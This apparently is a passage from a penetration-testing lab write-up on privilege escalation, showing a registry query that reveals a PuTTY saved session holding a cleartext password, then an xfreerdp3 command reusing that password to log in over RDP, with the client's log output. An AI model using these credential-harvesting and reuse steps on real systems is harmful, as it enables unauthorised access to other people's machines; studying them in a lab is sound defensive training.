c:\Program Files\PuTTY>reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions

zachary    REG_SZ    "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"

![[Privilege Escalation image 8.png]]

└─$ xfreerdp3 /cert:ignore /dynamic-resolution /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.143.145

\[10:13:50:450\] \[184158:0002cf68\] \[WARN\]\[com.freerdp.client.x11\] - \[load_map_from_xkbfile\]:     : keycode: 0x08 -> no RDP scancode found

\[10:13:50:450\] \[184158:0002cf68\] \[WARN\]\[com.freerdp.client.x11\] - \[load_map_from_xkbfile\]:     : keycode: 0x5D -> no RDP scancode found

\[10:13:51:289\] \[184158:0002cf68\] \[ERROR\]\[com.winpr.sspi.Kerberos\] - \[kerberos_AcquireCredentialsHandleA\]: krb5_parse_name (Configuration file does not specify default realm \[-1765328160\])

\[10:13:51:289\] \[184158:0002cf68\] \[ERROR\]\[com.winpr.sspi.Kerberos\] - \[kerberos_AcquireCredentialsHandleA\]: krb5_parse_name (Configuration file does not specify default realm \[-1765328160\])

\[10:13:52:823\] \[184158:0002cf68\] \[WARN\]\[com.freerdp.core.connection\] - \[rdp_client_connect_auto_detect\]: expected messageChannelId=1008, got 1003

\[10:13:52:823\] \[184158:0002cf68\] \[WARN\]\[com.freerdp.core.license\] - \[license_read_binary_blob_data\]: license binary blob::type BB_ERROR_BLOB, length=0, skipping.

\[10:13:52:837\] \[184158:0002cf68\] \[WARN\]\[com.freerdp.core.connection\] - \[rdp_client_connect_auto_detect\]: expected messageChannelId=1008, got 1003

\[10:13:52:920\] \[184158:0002cf68\] \[INFO\]\[com.freerdp.gdi\] - \[gdi_init_ex\]: Local framebuffer format  PIXEL_FORMAT_BGRX32

\[10:13:52:920\] \[184158:0002cf68\] \[INFO\]\[com.freerdp.gdi\] - \[gdi_init_ex\]: Remote framebuffer format PIXEL_FORMAT_BGRA32

\[10:13:52:949\] \[184158:0002cf68\] \[INFO\]\[com.freerdp.channels.rdpsnd.client\] - \[rdpsnd_load_device_plugin\]: \[static\] Loaded fake backend for rdpsnd

\[10:13:52:949\] \[184158:0002cf68\] \[INFO\]\[com.freerdp.channels.drdynvc.client\] - \[dvcman_load_addin\]: Loading Dynamic Virtual Channel ainput

\[10:13:52:950\] \[184158:0002cf68\] \[INFO\]\[com.freerdp.channels.drdynvc.client\] - \[dvcman_load_addin\]: Loading Dynamic Virtual Channel rdpgfx

\[10:13:52:950\] \[184158:0002cf68\] \[INFO\]\[com.freerdp.channels.drdynvc.client\] - \[dvcman_load_addin\]: Loading Dynamic Virtual Channel disp

\[10:13:52:950\] \[184158:0002cf68\] \[INFO\]\[com.freerdp.channels.drdynvc.client\] - \[dvcman_load_addin\]: Loading Dynamic Virtual Channel rdpsnd

\[10:13:53:567\] \[184158:0002cf92\] \[INFO\]\[com.freerdp.channels.rdpsnd.client\] - \[rdpsnd_load_device_plugin\]: \[dynamic\] Loaded fake backend for rdpsnd

\[10:13:53:927\] \[184158:0002cf68\] \[INFO\]\[com.freerdp.client.x11\] - \[xf_logon_error_info\]: Logon Error Info LOGON_FAILED_OTHER \[LOGON_MSG_BUMP_OPTIONS\]

\[10:14:26:676\] \[184158:0002cf68\] \[INFO\]\[com.freerdp.client.x11\] - \[xf_logon_error_info\]: Logon Error Info LOGON_FAILED_OTHER \[LOGON_MSG_SESSION_CONTINUE\]

\[10:14:28:101\] \[184158:0002cf92\] \[WARN\]\[com.freerdp.channels.drdynvc.client\] - \[check_open_close_receive\]: {Microsoft::Windows::RDS::DisplayControl:10} OnOpen=(nil), OnClose=0x7fd2852f5440

![[Privilege Escalation image 9.png]]